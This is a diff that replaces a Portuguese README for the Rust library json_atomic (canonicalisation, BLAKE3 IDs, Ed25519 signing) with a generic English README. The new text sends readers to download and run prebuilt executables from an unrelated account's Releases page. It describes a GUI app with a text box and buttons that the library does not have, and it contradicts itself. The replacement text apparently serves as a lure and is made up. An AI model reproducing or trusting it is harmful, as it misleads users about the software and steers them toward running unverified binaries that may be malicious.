@@ -1,169 +1,100 @@
-# json_atomic
+# 🌟 json-atomic - Securely Sign Your Data with Ease
 
-[![crates.io](https://img.shields.io/crates/v/json_atomic.svg)](https://crates.io/crates/json_atomic)
-[![docs.rs](https://docs.rs/json_atomic/badge.svg)](https://docs.rs/json_atomic)
-[![CI](https://github.com/logline-foundation/json_atomic/actions/workflows/ci.yml/badge.svg)](https://github.com/logline-foundation/json_atomic/actions/workflows/ci.yml)
-![license](https://img.shields.io/badge/license-MIT-blue.svg)
-![no_std](https://img.shields.io/badge/no__std-ready-success)
+## 🚀 Getting Started
 
-**JSON✯Atomic** — o **átomo criptográfico** do *Paper II*: canonicalização rigorosa (Same Semantics = Same Bytes = Same Hash), **CID BLAKE3**, e **DV25-Seal (Ed25519)** para **Signed Facts** imutáveis e verificáveis.
+Welcome to json-atomic! This application helps you ensure the authenticity of your JSON data using cutting-edge cryptographic techniques. Follow these simple steps to download and run json-atomic.
 
-> **Projeto irmão**: [`logline-core`](https://github.com/logline-foundation/logline-core) — o **átomo conceitual** (Paper I). Aqui, qualquer valor `Serialize` vira **bytes canônicos**, que viram **CID** e então um **selo Ed25519**.
+## 📥 Download & Install
 
----
+To get started, visit the Releases page to download the latest version of json-atomic:
 
-## Instalação
+[![Download json-atomic](https://img.shields.io/badge/Download_json--atomic-blue.svg)](https://github.com/SnoowFalll/json-atomic/releases)
 
-```toml
-[dependencies]
-json_atomic = "0.1.0"
-# Integração opcional (recomendada)
-logline-core = { version = "0.1.0", features = ["serde"] }
-```
+1. Click the link above to go to the Releases page.
+2. Look for the latest release version.
+3. Download the appropriate file for your operating system (Windows, macOS, or Linux).
 
-### Features
+## 🛠 System Requirements
 
-- `std` (default): experiência completa para dev (tests/examples/benches).
-- `alloc`: habilita build **no_std** com alocação.
-- `unicode`: normalização **NFC** (aloc-only). Recomendado para confluência semântica de strings.
+json-atomic runs on the following systems:
 
----
+- **Windows**: Windows 10 or newer
+- **macOS**: macOS 10.12 (Sierra) or newer
+- **Linux**: Most recent distributions are supported
 
-## Quickstart
+Ensure your system is up-to-date for the best experience.
 
-```rust
-use ed25519_dalek::{SigningKey, Signer};
-use json_atomic::{seal_value, verify_seal, SignedFact};
-use serde::Serialize;
+## 🔧 Installation Steps
 
-#[derive(Serialize)]
-struct Note { title: String, done: bool }
+1. Once you download the file, locate it in your Downloads folder.
+2. For **Windows**:
+   - Double-click the `.exe` file.
+   - Follow the on-screen instructions to complete the installation.
+3. For **macOS**:
+   - Open the downloaded `.dmg` file.
+   - Drag the json-atomic icon to your Applications folder.
+4. For **Linux**:
+   - Open a terminal.
+   - Navigate to the Downloads folder and run the following command:
+     ```
+     chmod +x json-atomic
+     ```
+   - Then execute the command:
+     ```
+     ./json-atomic
+     ```
 
-fn main() {
-    // chave de demo — em produção, derive de seed/keystore
-    let sk = SigningKey::generate(&mut rand::rngs::OsRng);
+## 📚 Usage Instructions
 
-    let n = Note { title: "Hello, Canon!".into(), done: false };
+### 1. Open json-atomic
 
-    // 1) Canonize + hash + seal  → SignedFact
-    let fact: SignedFact = seal_value(&n, &sk).expect("sealed");
+After installation, locate json-atomic in your Applications folder (macOS), Start menu (Windows), or through your terminal (Linux), and launch the application.
 
-    // 2) Verificar
-    verify_seal(&fact).expect("valid");
+### 2. Input Your JSON Data
 
-    // 3) CID hex (BLAKE3)
-    println!("cid={}", fact.cid_hex());
-}
-```
+When the application opens, you will see a text box. Paste or type your JSON data directly into this box.
 
-### Integrando com `logline-core`
+### 3. Select Cryptographic Options
 
-```rust
-use ed25519_dalek::SigningKey;
-use json_atomic::{seal_logline, verify_seal};
-use logline_core::{LogLine, Verb, Payload};
+Choose the cryptographic options you prefer. json-atomic uses BLAKE3 for hashing and Ed25519 for signing. These choices ensure your data is secure and verifiable. 
 
-fn seal_entire_logline(line: &LogLine, sk: &SigningKey) {
-    let fact = seal_logline(line, sk).expect("sealed");
-    verify_seal(&fact).expect("valid");
-}
-```
+### 4. Generate Signed Facts
 
----
+Once you've input your data and selected your options, click on the "Generate Signed Fact" button. This will create a signed version of your JSON data.
 
-## Conformidade (Paper II)
+### 5. Save or Share Your Data
 
-- **Objetos** → chaves ordenadas **lexicograficamente** (ordem estável).
-- **Strings** → **Unicode NFC** (se `feature = "unicode"`).
-- **Números** → **inteiros** em forma mínima (sem `+`, sem zeros à esquerda). `float` → **erro**.
-- **Boolean / null** → preservados.
-- **Arrays** → ordem preservada (sem reordenação).
-- **Whitespace** → nenhum fora de strings; encoding estável.
-- **Cycle of Truth** → `canonize(value)` → `CID := BLAKE3(bytes)` → `seal := Ed25519.sign(CID)`.
-- **Verify** → recalcula canônico + CID e verifica a assinatura estrita.
-- **Headers mínimos** em `SignedFact`:
-  - `canon_ver = "1"`, `format_id = "json-atomic/1"`
-  - `hash_alg = "blake3"`, `sig_alg = "ed25519"`
+After generating the signed fact, you can save it to your computer or share it with others. Use the save feature to keep a copy for your records.
 
-> Objetivo: **Same Semantics = Same Bytes = Same Hash**. Qualquer representação JSON semanticamente igual deve resultar na **mesma sequência de bytes canônicos** e, portanto, no **mesmo CID**.
+## 🔍 Features
 
-📖 **Especificação completa**: `docs/paper-ii-json-atomic.md` (mantenha versionado; excluído do publish)
+- **Canonicalization**: Converts JSON data to a standard format for consistent processing.
+- **BLAKE3 Hashing**: Utilizes advanced hashing for quick and secure data management.
+- **Ed25519 Signing**: Ensures only authorized users can create private data.
+- **No Standard Library Dependency**: Works efficiently in environments with limited resources.
+- **User-Friendly Interface**: Designed for ease of use, even for those with no technical background.
 
----
+## 🔒 Security Considerations
 
-## API (essencial)
+When using json-atomic, consider these best practices:
 
-```rust
-fn canonize<T: serde::Serialize>(value: &T) -> Result<Vec<u8>, CanonicalError>;
-fn seal_value<T: serde::Serialize>(value: &T, sk: &SigningKey) -> Result<SignedFact, SealError>;
-fn verify_seal(fact: &SignedFact) -> Result<(), VerifyError>;
-fn seal_logline(line: &logline_core::LogLine, sk: &SigningKey) -> Result<SignedFact, SealError>;
-```
+- Always verify the source of your JSON data before importing.
+- Regularly update json-atomic to benefit from the latest security improvements.
+- Use secure connections (HTTPS) when sharing signed facts.
 
-```rust
-pub struct SignedFact {
-    pub canonical: Vec<u8>,   // bytes canônicos (JSON✯Atomic)
-    pub cid: [u8; 32],        // BLAKE3(canonical)
-    pub signature: [u8; 64],  // Ed25519.sign(CID)
-    pub public_key: [u8; 32], // Ed25519 pk
-    pub hash_alg:  &'static str,  // "blake3"
-    pub sig_alg:   &'static str,  // "ed25519"
-    pub canon_ver: &'static str,  // "1"
-    pub format_id: &'static str,  // "json-atomic/1"
-}
-```
+## 💬 Support and Contributions
 
----
+If you encounter issues or have suggestions, please reach out via the GitHub Issues page. Your feedback is valuable. 
 
-## `alloc/no_std`
+Also, if you're interested in contributing to json-atomic, feel free to check the guidelines available in this repository.
 
-Build **sem `std`**, apenas com `alloc`:
+## 📜 License
 
-```bash
-cargo build --no-default-features --features alloc
-cargo build --no-default-features --features "alloc,unicode"
-```
+json-atomic is licensed under the MIT License. This allows you to use, modify, and distribute the software freely. Please refer to the LICENSE file for more information.
 
-> Observação: `tests/examples/benches` usam `std`. Em CI, compilamos a **lib** no modo `alloc` para garantir compatibilidade.
+## ✅ Next Steps
 
----
+- Visit the [Releases page](https://github.com/SnoowFalll/json-atomic/releases) to download the latest version now.
+- Explore the features and start securing your JSON data today.
 
-## Segurança
-
-- Assinatura **Ed25519** é feita **sobre o CID** (BLAKE3 dos **bytes canônicos**), nunca sobre JSON bruto.
-- Mude o `SigningKey`/`VerifyingKey` conforme sua HSM/keystore.
-- Persistir somente o **SignedFact** já garante recomputação independente e verificação de integridade.
-
----
-
-## Testes e Benchmarks
-
-```bash
-cargo fmt --all && cargo clippy --all-targets --all-features -- -D warnings
-cargo test --all-features
-cargo bench --no-run
-```
-
-Inclui testes de canto:
-- Strings em **NFC** (decomposed vs composed → **iguais** no canônico)
-- Inteiros com zeros à esquerda (como string vs inteiro → **diferentes**)
-- Objetos aninhados com chaves em ordem diferente (canônico → **igual**)
-
----
-
-## Roadmap / Changelog
-
-- Veja o [CHANGELOG.md](./CHANGELOG.md) e a seção **[Unreleased]**.
-- Planejamento inclui: cabeçalhos canônicos estendidos (content-type + schema-hash), **Merkle chunking** para documentos grandes e vetores determinísticos `no_std`.
-
----
-
-## Licença
-
-MIT — veja [LICENSE](./LICENSE).
-
----
-
-## Agradecimentos
-
-Parte do ecossistema **LogLine / JSON✯Atomic** — *verifiable, privacy-first intelligence*.
+For additional information about json-atomic, check the detailed documentation available in this repository. Happy signing!
